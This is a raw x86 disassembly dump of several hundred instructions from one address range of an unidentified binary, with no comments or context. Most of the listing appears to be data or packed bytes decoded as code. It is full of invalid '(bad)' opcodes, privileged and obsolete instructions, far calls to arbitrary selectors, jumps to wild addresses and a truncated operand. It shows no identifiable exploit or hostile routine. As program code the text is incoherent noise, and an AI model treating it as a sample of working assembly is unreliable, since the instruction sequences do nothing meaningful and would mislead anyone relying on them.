  42c913:	leave  
  42c914:	mov    dl,0x70
  42c916:	jnp    0x42c912
  42c918:	pop    eax
  42c919:	mov    ds:0x13433c4b,eax
  42c91e:	lods   eax,DWORD PTR ds:[esi]
  42c91f:	sub    ecx,DWORD PTR [ecx+0x735c13c3]
  42c925:	xchg   esp,eax
  42c926:	(bad)  
  42c927:	mov    DWORD PTR [edi+0x3d],ecx
  42c92a:	dec    ebp
  42c92b:	(bad)  
  42c92c:	mov    esi,0x713c1cf5
  42c931:	dec    ebp
  42c932:	fidivr WORD PTR [ebp+0x15]
  42c935:	sbb    DWORD PTR [ebx+0x72972f89],ebp
  42c93b:	cmp    al,0xe9
  42c93d:	jne    0x42c995
  42c93f:	inc    edx
  42c940:	(bad)  
	...
  42c9b2:	add    BYTE PTR [eax],al
  42c9b4:	mov    eax,DWORD PTR [edi]
  42c9b6:	mov    al,0xe2
  42c9b8:	mov    esp,0xb56fdbf7
  42c9bd:	ficom  DWORD PTR [esi+0x22]
  42c9c0:	inc    ebp
  42c9c1:	std    
  42c9c2:	pop    ss
  42c9c3:	in     al,0xaa
  42c9c5:	fadd   DWORD PTR [ecx]
  42c9c7:	add    dh,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [ecx+0x8],ah
  42c9ce:	mov    esi,0xb5834851
  42c9d3:	pop    eax
  42c9d4:	xchg   ecx,eax
  42c9d5:	test   BYTE PTR [ecx+0x3a67b73],0x54
  42c9dc:	xchg   ecx,eax
  42c9dd:	mov    bh,0x43
  42c9df:	popf   
  42c9e0:	je     0x42ca57
  42c9e2:	jo     0x42c9c4
  42c9e4:	scas   al,BYTE PTR es:[edi]
  42c9e5:	out    dx,al
  42c9e6:	jmp    0x2bd4a491
  42c9eb:	sbb    eax,0xde09e0f5
  42c9f0:	fnstenv [edx+0x499f234]
  42c9f6:	pop    edi
  42c9f7:	push   ss
  42c9f8:	mov    esi,0x2cc3c35b
  42c9fd:	adc    BYTE PTR [ecx+0x1a6484ce],ch
  42ca03:	repz and DWORD PTR [edx+0x5d],esp
  42ca07:	add    DWORD PTR [edx*8-0x3fcbd1c1],ebp
  42ca0e:	jecxz  0x42ca8c
  42ca10:	push   esi
  42ca11:	jnp    0x42c9d8
  42ca13:	cs and ebp,esi
  42ca16:	cld    
  42ca17:	shl    esi,1
  42ca19:	ret    0x6fbf
  42ca1c:	pop    edx
  42ca1d:	inc    ebp
  42ca1e:	mov    al,0xc6
  42ca20:	adc    eax,0xa64e056c
  42ca25:	adc    bh,bl
  42ca27:	or     BYTE PTR [ebx],cl
  42ca29:	adc    BYTE PTR [eax+edx*2+0x66],0x33
  42ca2e:	(bad)  
  42ca2f:	dec    eax
  42ca30:	pop    edx
  42ca31:	mov    ds:0x125ff72e,eax
  42ca36:	sbb    bl,BYTE PTR [ebp+0x36]
  42ca39:	xor    al,0xbd
  42ca3b:	cmp    eax,0xfb8446ca
  42ca40:	adc    edx,DWORD PTR [ebp-0x7600471d]
  42ca46:	jb     0x42ca31
  42ca48:	add    eax,0x596ec4c3
  42ca4d:	vinserti64x4 zmm5{k2},zmm2,YMMWORD PTR [ebx+ebx*1+0x44071dc7]{1to8},0xb2
  42ca59:	rcr    DWORD PTR ds:0x18c7094,0xff
  42ca60:	loopne 0x42cacb
  42ca62:	(bad)  
  42ca63:	mov    ds:0xb299312d,eax
  42ca68:	fmul   DWORD PTR ds:0x8d5eb91
  42ca6e:	cmp    eax,0xa0af3667
  42ca74:	les    edx,FWORD PTR [eax+0x4535e3b4]
  42ca7a:	inc    ebp
  42ca7b:	(bad)  
  42ca7c:	std    
  42ca7d:	dec    ebx
  42ca7e:	jmp    0x42ca87
  42ca80:	mov    gs,ebp
  42ca82:	stc    
  42ca83:	adc    eax,edx
  42ca85:	mov    edi,0x4a799752
  42ca8a:	xor    BYTE PTR [edi-0x67],dh
  42ca8d:	push   ecx
  42ca8e:	inc    edi
  42ca8f:	lods   eax,DWORD PTR ds:[esi]
  42ca90:	shl    esp,cl
  42ca92:	add    DWORD PTR [ecx-0x6635fb74],ebx
  42ca98:	shl    DWORD PTR [esi-0x4b],0xa1
  42ca9c:	cmp    DWORD PTR [ebp-0x81e45db],esp
  42caa2:	adc    DWORD PTR [edi+ecx*2],0x5daf2ece
  42caa9:	les    edi,FWORD PTR [ecx-0x274db05f]
  42caaf:	out    0x9f,al
  42cab1:	pop    ds
  42cab2:	stos   BYTE PTR es:[edi],al
  42cab3:	dec    ecx
  42cab4:	in     eax,dx
  42cab5:	pop    edx
  42cab6:	fild   QWORD PTR [ebx+edi*1+0x6b]
  42caba:	xchg   ecx,eax
  42cabb:	ins    BYTE PTR es:[edi],dx
  42cabc:	inc    dh
  42cabe:	mov    bh,0xa9
  42cac0:	js     0x42cac9
	...
  42cb32:	add    BYTE PTR [eax],al
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	test   al,0x7b
  42cb42:	fisub  WORD PTR [ecx-0x60]
  42cb45:	fld    DWORD PTR [ecx]
  42cb47:	add    dh,dh
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [esi+0x53681b42],dl
  42cb51:	adc    BYTE PTR [ecx],ah
  42cb53:	pop    esp
  42cb54:	jecxz  0x42cb80
  42cb56:	test   eax,0xf9ec4c67
  42cb5b:	div    DWORD PTR [eax-0x2a]
  42cb5e:	les    eax,FWORD PTR [ebp-0x2f078cb3]
  42cb64:	cs inc esi
  42cb66:	jle    0x42cb16
  42cb68:	push   0xf
  42cb6a:	fisttp QWORD PTR [ebp-0x19]
  42cb6d:	or     edi,esp
  42cb6f:	or     al,0x44
  42cb71:	jle    0x42cb9d
  42cb73:	scas   al,BYTE PTR es:[edi]
  42cb74:	imul   esp,DWORD PTR [ebp-0x64],0x1463a890
  42cb7b:	test   al,0x5b
  42cb7d:	cmp    DWORD PTR [ebx],esp
  42cb7f:	test   eax,0x16d9facf
  42cb84:	or     DWORD PTR [esi-0x114b82c7],ebp
  42cb8a:	mov    al,ds:0x3f2531be
  42cb8f:	mov    ds:0xd5bb1d6a,eax
  42cb94:	lods   al,BYTE PTR ds:[esi]
  42cb95:	xlat   BYTE PTR ds:[ebx]
  42cb96:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42cb98:	rcl    ah,0xcc
  42cb9b:	(bad)  
  42cb9c:	ins    BYTE PTR es:[edi],dx
  42cb9d:	add    eax,0x585d8ce6
  42cba2:	sbb    al,0xc4
  42cba4:	adc    DWORD PTR [esi],0xffffffeb
  42cba7:	scas   al,BYTE PTR es:[edi]
  42cba8:	and    esp,esi
  42cbaa:	or     ah,al
  42cbac:	(bad)  
  42cbad:	cld    
  42cbae:	scas   eax,DWORD PTR es:[edi]
  42cbaf:	in     al,0xac
  42cbb1:	inc    ebp
  42cbb2:	xlat   BYTE PTR ds:[ebx]
  42cbb3:	xlat   BYTE PTR ds:[ebx]
  42cbb4:	pop    ebx
  42cbb5:	adc    edi,DWORD PTR [edi-0x58d57c27]
  42cbbb:	popf   
  42cbbc:	or     ch,dl
  42cbbe:	push   ds
  42cbbf:	xchg   ebx,eax
  42cbc0:	(bad)  
  42cbc2:	mov    dl,0x32
  42cbc4:	out    dx,eax
  42cbc5:	cmp    edi,DWORD PTR [ecx+ecx*1-0x54]
  42cbc9:	fdivp  st(7),st
  42cbcb:	rcr    dl,0x66
  42cbce:	mov    esp,0x8446096b
  42cbd3:	enter  0xb337,0xcb
  42cbd7:	sbb    ch,al
  42cbd9:	iret   
  42cbda:	dec    edx
  42cbdb:	adc    esi,esp
  42cbdd:	scas   al,BYTE PTR es:[edi]
  42cbde:	mov    eax,0x7622d4d4
  42cbe3:	inc    esp
  42cbe4:	fimul  DWORD PTR [esi-0x4d4a9795]
  42cbea:	jnp    0x42cbfb
  42cbec:	or     ebp,esp
  42cbee:	and    al,BYTE PTR [ebx]
  42cbf0:	jg     0x42cbf5
  42cbf2:	and    cl,bh
  42cbf4:	sbb    eax,0x45119376
  42cbf9:	retf   
  42cbfa:	and    BYTE PTR [ebx+0x2e78d186],0x69
  42cc01:	jle    0x42cc81
  42cc03:	cmp    DWORD PTR [edx+0x2b26160d],edx
  42cc09:	hlt    
  42cc0a:	pmullw mm6,QWORD PTR [edi]
  42cc0d:	sub    esp,eax
  42cc0f:	cmp    al,BYTE PTR [ebp+0x6f]
  42cc12:	mov    BYTE PTR [eax],0x68
  42cc15:	push   edi
  42cc16:	lea    edx,[edi-0x53a20502]
  42cc1c:	(bad)  
  42cc20:	jle    0x42cba6
  42cc22:	push   edx
  42cc23:	sahf   
  42cc24:	and    dl,BYTE PTR fs:[ecx+0x2e34bc21]
  42cc2b:	inc    ecx
  42cc2c:	(bad)  
  42cc2d:	in     eax,0xc
  42cc2f:	cmp    BYTE PTR [ebp*1+0x31a67508],0x6b
  42cc37:	addr16 jno 0x42ccb1
  42cc3a:	mov    esp,?
  42cc3c:	es stos DWORD PTR es:[edi],eax
  42cc3e:	jnp    0x42ccad
  42cc40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc41:	arpl   WORD PTR [eax],ax
	...
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    esi,DWORD PTR [eax-0x6992c1e3]
  42ccc5:	fiadd  DWORD PTR [ecx]
  42ccc7:	add    dh,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebx],bh
  42cccd:	imul   ebx,DWORD PTR [ebp+0x1c],0x50
  42ccd1:	mov    dl,0x1b
  42ccd3:	(bad)  
  42ccd4:	int3   
  42ccd5:	or     dl,BYTE PTR [edx+0x6e81d9a9]
  42ccdb:	inc    esi
  42ccdc:	add    dh,BYTE PTR [edi+0x3e]
  42ccdf:	test   DWORD PTR [esi-0x1dfee8cf],edi
  42cce5:	xor    DWORD PTR [ebx+0x69d85434],ebx
  42cceb:	and    al,bh
  42cced:	and    edi,DWORD PTR ds:0x615b0a2
  42ccf3:	inc    edx
  42ccf4:	adc    DWORD PTR [edx+ecx*8-0x6b],edi
  42ccf8:	push   cs
  42ccf9:	fwait
  42ccfa:	test   al,0x4f
  42ccfc:	push   0xffffff9b
  42ccfe:	mov    edi,0x5c730fc3
  42cd03:	jecxz  0x42cd3f
  42cd05:	xchg   BYTE PTR [ebx],ah
  42cd07:	call   0x31579fca
  42cd0c:	fnstenv [esi]
  42cd0e:	rcr    DWORD PTR [edi],0x1c
  42cd11:	fdiv   st,st(0)
  42cd13:	pop    ebx
  42cd14:	mov    eax,ds:0xe07fe5a4
  42cd19:	xor    ch,bh
  42cd1b:	add    dl,ah
  42cd1d:	push   esi
  42cd1e:	xor    BYTE PTR [edi+0x6c981337],al
  42cd24:	push   0xfffffff8
  42cd26:	jnp    0x42cd55
  42cd28:	cdq    
  42cd29:	inc    ecx
  42cd2a:	pop    ss
  42cd2b:	mov    ds:0x9b69714b,al
  42cd30:	repz sub al,0x44
  42cd33:	sbb    al,BYTE PTR [ebp-0x69118a2e]
  42cd39:	daa    
  42cd3a:	mov    al,0x99
  42cd3c:	mov    eax,ds:0x9d79b9f2
  42cd41:	cmp    dl,dl
  42cd43:	push   eax
  42cd44:	(bad)  
  42cd46:	or     edx,DWORD PTR [ebp+edi*4+0x17]
  42cd4a:	jno    0x42cdbf
  42cd4c:	es inc esp
  42cd4e:	ins    BYTE PTR es:[edi],dx
  42cd4f:	les    eax,FWORD PTR [ecx]
  42cd51:	xor    dh,dh
  42cd53:	les    ecx,FWORD PTR [ecx-0x56]
  42cd56:	adc    BYTE PTR [esi+0x6adfd1b9],bh
  42cd5c:	sar    DWORD PTR [eax+0xa4e427],0xf1
  42cd63:	sub    DWORD PTR [esi-0x5b],esi
  42cd66:	sub    DWORD PTR [eax-0x2761f033],edi
  42cd6c:	int3   
  42cd6d:	jbe    0x42cde9
  42cd6f:	xchg   ecx,eax
  42cd70:	jae    0x42cd81
  42cd72:	fwait
  42cd73:	dec    edi
  42cd74:	out    dx,eax
  42cd75:	mov    eax,ds:0xb09be55e
  42cd7a:	std    
  42cd7b:	popa   
  42cd7c:	dec    edx
  42cd7d:	add    ebx,edx
  42cd7f:	sub    bh,BYTE PTR [ecx-0x39]
  42cd82:	and    bl,dh
  42cd84:	pop    edi
  42cd85:	or     eax,0x447ceb39
  42cd8a:	or     al,BYTE PTR [ebx]
  42cd8c:	or     DWORD PTR [ebx+ecx*2-0x72],edi
  42cd90:	mov    bl,0xbb
  42cd92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd93:	das    
  42cd94:	fcomp  DWORD PTR [ebx]
  42cd96:	xchg   esp,eax
  42cd97:	aas    
  42cd98:	pop    ecx
  42cd99:	jo     0x42cd3e
  42cd9b:	cld    
  42cd9c:	(bad)  
  42cd9d:	enter  0x37b4,0xfd
  42cda1:	and    BYTE PTR [ebx],ah
  42cda3:	mov    edi,ebp
  42cda5:	outs   dx,DWORD PTR ds:[esi]
  42cda6:	std    
  42cda7:	out    dx,eax
  42cda8:	sub    al,0xdf
  42cdaa:	inc    esi
  42cdab:	jecxz  0x42cd39
  42cdad:	mov    ebp,0x1145ff78
  42cdb2:	push   ds
  42cdb3:	ins    DWORD PTR es:[edi],dx
  42cdb4:	add    eax,0xcb601a44
  42cdb9:	sbb    eax,0xa5e2e873
  42cdbe:	ss ins BYTE PTR es:[edi],dx
  42cdc0:	lods   al,BYTE PTR ds:[esi]
  42cdc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0xe919410a
  42ce41:	out    dx,eax
  42ce42:	mov    dh,0xf2
  42ce44:	mov    ebx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	test   BYTE PTR [eax],0x0
  42ce4b:	add    BYTE PTR [eax],ch
  42ce4d:	xchg   ebx,eax
  42ce4e:	clc    
  42ce4f:	rcr    BYTE PTR [edi+0x765430b0],1
  42ce55:	adc    ebx,DWORD PTR [ecx+0x3d]
  42ce58:	rcr    BYTE PTR [ecx],cl
  42ce5a:	xor    al,0x9f
  42ce5c:	leave  
  42ce5d:	lods   eax,DWORD PTR ds:[esi]
  42ce5e:	repnz xor BYTE PTR [ebp+0x48],0x61
  42ce63:	xchg   esi,eax
  42ce64:	xor    cl,BYTE PTR [esi]
  42ce66:	dec    edx
  42ce67:	sbb    dh,BYTE PTR [eax+0x6f1dfb39]
  42ce6d:	cmp    edi,edi
  42ce6f:	cs call 0x23aa:0x727fe850
  42ce77:	sbb    DWORD PTR [ebx-0x5e76a689],esi
  42ce7d:	cmp    eax,0xe6fc5e78
  42ce82:	ins    BYTE PTR es:[edi],dx
  42ce83:	push   eax
  42ce84:	mov    DWORD PTR [eax],edi
  42ce86:	adc    eax,0x18f269f
  42ce8b:	inc    ebx
  42ce8c:	sbb    eax,0x1c82061
  42ce91:	adc    bl,bh
  42ce93:	or     eax,0x10347486
  42ce98:	xchg   edi,eax
  42ce99:	pusha  
  42ce9a:	fld    QWORD PTR [edx]
  42ce9c:	call   0x11f1:0xee86e842
  42cea3:	ret    
  42cea4:	pop    edi
  42cea5:	ret    
  42cea6:	loopne 0x42ce7f
  42cea8:	adc    cl,BYTE PTR [ebx-0x4b]
  42ceab:	or     al,BYTE PTR [ecx]
  42cead:	jl     0x42cead
  42ceaf:	inc    ebx
  42ceb0:	push   ss
  42ceb1:	fwait
  42ceb2:	or     BYTE PTR [edx+0x6c17dba8],ah
  42ceb8:	add    al,0xb4
  42ceba:	das    
  42cebb:	stos   DWORD PTR es:[edi],eax
  42cebc:	out    0xbe,eax
  42cebe:	jne    0x42ceeb
  42cec0:	or     BYTE PTR [ebx-0x12ebc831],cl
  42cec6:	icebp  
  42cec7:	xchg   esi,eax
  42cec8:	sbb    DWORD PTR [esi],edi
  42ceca:	inc    esi
  42cecb:	js     0x42ce4f
  42cecd:	jnp    0x42ceca
  42cecf:	rsm    
  42ced1:	jae    0x42cf11
  42ced3:	xchg   ebx,eax
  42ced4:	in     al,dx
  42ced5:	addr16 call 0x213a:0x69e1d635
  42cedd:	push   ebp
  42cede:	pop    edx
  42cedf:	mov    bl,0x2
  42cee1:	jo     0x42cf3c
  42cee3:	xor    edi,esp
  42cee5:	shl    DWORD PTR [edx],cl
  42cee7:	jbe    0x42ce97
  42cee9:	aad    0x4d
  42ceeb:	outs   dx,DWORD PTR ds:[esi]
  42ceec:	loop   0x42cf13
  42ceee:	inc    ecx
  42ceef:	rcl    DWORD PTR [eax],cl
  42cef1:	mov    edx,eax
  42cef3:	sar    BYTE PTR [ecx],1
  42cef5:	test   DWORD PTR [esi+0x2a],0x8e1411b9
  42cefc:	int3   
  42cefd:	xor    ch,bh
  42ceff:	mov    ah,0x2c
  42cf01:	popa   
  42cf02:	cs scas eax,DWORD PTR es:[edi]
  42cf04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf05:	lods   al,BYTE PTR ds:[esi]
  42cf06:	call   0x7735:0x1d39a221
  42cf0d:	adc    al,0x11
  42cf0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf10:	pusha  
  42cf11:	push   ebp
  42cf12:	jge    0x42cf81
  42cf14:	jnp    0x42ceaf
  42cf16:	das    
  42cf17:	imul   esi,DWORD PTR [esi+edx*8],0x2e
  42cf1b:	add    al,0xc5
  42cf1d:	add    DWORD PTR [edx-0x1015a125],edx
  42cf23:	inc    esp
  42cf24:	loopne 0x42cf42
  42cf26:	mov    dl,bh
  42cf28:	xlat   BYTE PTR ds:[ebx]
  42cf29:	inc    esp
  42cf2a:	pop    esi
  42cf2b:	xchg   DWORD PTR [esi+ebx*2],eax
  42cf2e:	sbb    BYTE PTR ds:0xef2cc8d3,ah
  42cf34:	mov    eax,0xec956e80
  42cf39:	repnz loop 0x42cec7
  42cf3c:	popa   
  42cf3d:	xchg   esp,eax
  42cf3e:	sbb    bl,ch
  42cf40:	sti    
  42cf41:	mov    eax,0x0
	...
  42cfb2:	add    BYTE PTR [eax],al
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x34
  42cfc1:	rcl    BYTE PTR [edx+eiz*4],1
  42cfc4:	sbb    ah,0x1
  42cfc7:	add    dh,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [eax-0x16],dh
  42cfce:	pop    DWORD PTR [ecx]
  42cfd0:	mov    cl,0x4a
  42cfd2:	adc    DWORD PTR [edx],esp
  42cfd4:	mov    esi,0x96a8197a
  42cfd9:	mov    ch,0x44
  42cfdb:	or     cl,ch
  42cfdd:	into   
  42cfde:	std    
  42cfdf:	sub    eax,0xecf05248
  42cfe4:	jbe    0x42d020
  42cfe6:	mov    ecx,0xe5a89871
  42cfeb:	push   esp
  42cfec:	jg     0x42cffa
  42cfee:	sub    al,0x95
  42cff0:	mov    dl,0x38
  42cff2:	jl     0x42cfd4
  42cff4:	adc    esi,DWORD PTR [eax+0x2f8c8f95]
  42cffa:	dec    ebp
  42cffb:	pop    ss
  42cffc:	or     dh,BYTE PTR [ecx+0x557f9fb4]
  42d002:	inc    ecx
  42d003:	sub    edi,DWORD PTR [eax+0x4d]
  42d006:	sahf   
  42d007:	scas   al,BYTE PTR es:[edi]
  42d008:	xchg   edx,eax
  42d009:	sti    
  42d00a:	clc    
  42d00b:	jmp    0x29211e38
  42d010:	mov    ch,0x7b
  42d012:	and    edi,ebp
  42d014:	loop   0x42cfbd
  42d016:	int3   
  42d017:	fcmovbe st,st(3)
  42d019:	xchg   DWORD PTR [ebx+0x14],ebp
  42d01c:	add    eax,0x482bd17e
  42d021:	and    BYTE PTR [esi+0x2b],0x99
  42d025:	cli    
  42d026:	cmp    DWORD PTR [edi],edx
  42d028:	xor    BYTE PTR [ebx+0x1f],dh
  42d02b:	idiv   BYTE PTR [esi+ecx*4-0x42]
  42d02f:	mov    ecx,0x2d20290c
  42d034:	icebp  
  42d035:	ucomiss xmm1,xmm4
  42d038:	nop
  42d039:	mov    edx,0xbcafdd04
  42d03e:	xor    BYTE PTR [eax+0x9],ah
  42d041:	(bad)  
  42d043:	dec    edx
  42d044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d045:	sbb    eax,DWORD PTR [edx+0x44]
  42d048:	popa   
  42d049:	xchg   ebp,eax
  42d04a:	arpl   ax,bx
  42d04c:	stos   DWORD PTR es:[edi],eax
  42d04d:	leave  
  42d04e:	pushf  
  42d04f:	fmul   DWORD PTR [esi-0x52]
  42d052:	cmp    al,0x1c
  42d054:	leave  
  42d055:	mov    ebp,0x25b48227
  42d05a:	call   0x7dab7bc2
  42d05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d060:	cmp    bh,ah
  42d062:	xchg   esp,eax
  42d063:	or     al,0x77
  42d065:	xchg   BYTE PTR [edi],bh
  42d067:	fild   WORD PTR [ebx]
  42d069:	pusha  
  42d06a:	std    
  42d06b:	dec    ebx
  42d06c:	and    ecx,ecx
  42d06e:	jno    0x42d0b3
  42d070:	ins    DWORD PTR es:[edi],dx
  42d071:	dec    esi
  42d072:	cs push esp
  42d074:	imul   ah
  42d076:	arpl   WORD PTR [esi],sp
  42d078:	cmp    ah,cl
  42d07a:	ja     0x42d0f0
  42d07c:	shr    DWORD PTR [edi],cl
  42d07e:	call   FWORD PTR [edx+0x11]
  42d081:	repnz mov gs:0xbdd82a0f,al
  42d088:	jp     0x42d01e
  42d08a:	enter  0xc39d,0x2c
  42d08e:	dec    DWORD PTR [ebx]
  42d090:	adc    edi,DWORD PTR es:[ebx-0x739f80e2]
  42d097:	mov    ecx,edx
  42d099:	nop    ebx
  42d09c:	stos   DWORD PTR es:[edi],eax
  42d09d:	pop    es
  42d09e:	cld    
  42d09f:	xchg   edx,eax
  42d0a0:	aaa    
  42d0a1:	retf   0xf7a9
  42d0a4:	(bad)
  42d0a9:	lds    ebx,FWORD PTR [ebx]
  42d0ab:	add    DWORD PTR [ebx+edi*1+0x27],0x6ad58886
  42d0b3:	push   ecx
  42d0b4:	xchg   ebp,eax
  42d0b5:	ja     0x42d0cb
  42d0b7:	and    edi,DWORD PTR [eax]
  42d0b9:	pop    esi
  42d0ba:	adc    ch,BYTE PTR [ebx]
  42d0bc:	push   0xffffffcf
  42d0be:	cs retf 
  42d0c0:	in     al,0x35
	...
  42d132:	add    BYTE PTR [eax],al
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0x7488f150
  42d143:	cmp    DWORD PTR [eax-0x23],0x1
  42d147:	add    dh,dh
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    dl,ch
  42d14d:	jb     0x42d1ba
  42d14f:	dec    esp
  42d150:	mov    al,0x21
  42d153:	ins    DWORD PTR es:[edi],dx
  42d154:	(bad)  
  42d155:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42d157:	dec    esp
  42d158:	inc    esp
  42d159:	aam    0x12
  42d15b:	popf   
  42d15c:	push   esp
  42d15d:	xchg   ebx,eax
  42d15e:	pusha  
  42d15f:	push   0xffffffa3
  42d161:	aaa    
  42d162:	jmp    0x42d1d1
  42d164:	add    ah,bh
  42d166:	or     DWORD PTR [edx],eax
  42d168:	gs inc eax
  42d16a:	stos   BYTE PTR es:[edi],al
  42d16b:	add    DWORD PTR [esi],ebp
  42d16d:	cld    
  42d16e:	(bad)  
  42d16f:	dec    ecx
  42d170:	stc    
  42d171:	call   0xf58c:0xd7d84122
  42d178:	scas   eax,DWORD PTR es:[edi]
  42d179:	mov    ecx,ebx
  42d17b:	aas    
  42d17c:	dec    edi
  42d17d:	inc    ecx
  42d17e:	push   esi
  42d17f:	out    0x7b,eax
  42d181:	mov    dl,0xd6
  42d183:	fneni(8087 only) 
  42d185:	cmovbe esi,ecx
  42d188:	pop    esp
  42d189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d18a:	or     eax,0x9e71a90b
  42d18f:	test   BYTE PTR [ecx],dh
  42d191:	loop   0x42d211
  42d193:	mov    WORD PTR [eax-0x6537f02f],fs
  42d199:	cwde   
  42d19a:	inc    eax
  42d19b:	pop    ds
  42d19c:	mov    ecx,0x5d93c965
  42d1a1:	pop    ebp
  42d1a2:	inc    eax
  42d1a3:	push   esi
  42d1a4:	(bad)  
  42d1a6:	js     0x42d177
  42d1a8:	mov    DWORD PTR [ecx+ebp*4-0x53],0x5eba0ed6
  42d1b0:	dec    ecx
  42d1b1:	inc    ecx
  42d1b2:	scas   eax,DWORD PTR es:[edi]
  42d1b3:	lods   al,BYTE PTR ds:[esi]
  42d1b4:	stc    
  42d1b5:	adc    al,0xeb
  42d1b7:	into   
  42d1b8:	sti    
  42d1b9:	mov    eax,ds:0x59adec6c
  42d1be:	sar    ebp,1
  42d1c0:	sub    ah,BYTE PTR [edx+0x1675544]
  42d1c6:	jmp    0x4ae78ef3
  42d1cb:	mov    ebp,0x94728c43
  42d1d0:	pushf  
  42d1d1:	shl    cl,1
  42d1d3:	aas    
  42d1d4:	mov    eax,0xfeb6f5b8
  42d1d9:	jne    0x42d1fd
  42d1db:	test   DWORD PTR [edx+0x2216abe9],0x2e34093a
  42d1e5:	cmc    
  42d1e6:	pop    eax
  42d1e7:	xor    al,0xf7
  42d1e9:	scas   al,BYTE PTR es:[edi]
  42d1ea:	enter  0x7f22,0x49
  42d1ee:	sti    
  42d1ef:	push   ebp
  42d1f0:	aas    
  42d1f1:	inc    esp
  42d1f2:	pop    ecx
  42d1f3:	jecxz  0x42d205
  42d1f5:	mov    dh,0x86
  42d1f7:	dec    esp
  42d1f8:	dec    edi
  42d1f9:	or     BYTE PTR [ecx+eax*2-0x1e],al
  42d1fd:	push   esi
  42d1fe:	pop    ds
  42d1ff:	adc    eax,0x1fedbc87
  42d204:	loopne 0x42d244
  42d206:	xchg   ecx,eax
  42d207:	jb     0x42d1d4
  42d209:	sub    esp,DWORD PTR [edi]
  42d20b:	je     0x42d24c
  42d20d:	call   0xe50d7ed2
  42d212:	out    0x9e,al
  42d214:	test   eax,0x513274b1
  42d219:	mov    cl,0xf2
  42d21b:	dec    esi
  42d21c:	out    dx,al
  42d21d:	xchg   ecx,eax
  42d21e:	jp     0x42d256
  42d220:	into   
  42d221:	xlat   BYTE PTR ds:[ebx]
  42d222:	shl    BYTE PTR [ebx],1
  42d224:	jae    0x42d242
  42d226:	ret    
  42d227:	rcl    BYTE PTR [esi-0x707e3709],cl
  42d22d:	pop    ds
  42d22e:	popf   
  42d22f:	fcom   st(7)
  42d231:	in     eax,dx
  42d232:	mov    edi,0x563b0071
  42d237:	mov    dl,0x6f
  42d239:	mov    ebp,0x19fbc6a2
  42d23e:	xor    DWORD PTR [edi+0x55c2],esi
	...
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	xor    cl,bl
  42d2c2:	das    
  42d2c3:	or     eax,0x1de6e
  42d2c8:	test   BYTE PTR [eax],0x0
  42d2cb:	add    BYTE PTR [ebp-0x54a537da],bl
  42d2d1:	xchg   ebx,eax
  42d2d2:	jp     0x42d2ed
  42d2d4:	push   edi
  42d2d5:	lahf   
  42d2d6:	and    dl,BYTE PTR [esi+0x7ac8e787]
  42d2dc:	iret   
  42d2dd:	add    cl,BYTE PTR [ebp-0x8e3b3f3]
  42d2e3:	(bad)
  42d2e6:	leave  
  42d2e7:	dec    esp
  42d2e8:	or     al,0x23
  42d2ea:	jmp    0xe290be1e
  42d2ef:	mov    al,ds:0x695eb1ee
  42d2f4:	pop    ecx
  42d2f5:	pop    es
  42d2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2f7:	pop    eax
  42d2f8:	xchg   edi,eax
  42d2f9:	xchg   edx,eax
  42d2fa:	pushf  
  42d2fb:	mov    es,WORD PTR [ebx-0x59b8d606]
  42d301:	and    BYTE PTR [edx],cl
  42d303:	pusha  
  42d304:	jmp    0xb8b6b140
  42d309:	cmp    bl,bh
  42d30b:	pushw  cs
  42d30d:	inc    esp
  42d30e:	int    0x5
  42d310:	sbb    al,0xa7
  42d312:	jp     0x42d367
  42d314:	cmp    BYTE PTR [ecx+0x760a6ade],cl
  42d31a:	lods   al,BYTE PTR ds:[esi]
  42d31b:	clc    
  42d31c:	shr    BYTE PTR [edx+edx*2-0x3910d985],cl
  42d323:	test   eax,0xd9dca3f2
  42d328:	idiv   dl
  42d32a:	jecxz  0x42d377
  42d32c:	int    0x2a
  42d32e:	frstor ds:0x5bcdf408
  42d334:	inc    esi
  42d335:	or     DWORD PTR [ecx],esi
  42d337:	jne    0x42d2dd
  42d339:	ficom  WORD PTR [ecx+edx*1-0x7b]
  42d33d:	adc    al,ah
  42d33f:	paddd  mm1,mm5
  42d342:	js     0x42d345
  42d344:	retf   
  42d345:	adc    al,0x73
  42d347:	and    esp,DWORD PTR [edi]
  42d349:	(bad)  
  42d34b:	mov    ds:0x19f32863,eax
  42d350:	adc    eax,0x202d2b9d
  42d355:	pop    ebx
  42d356:	cmp    al,0xe6
  42d358:	cmc    
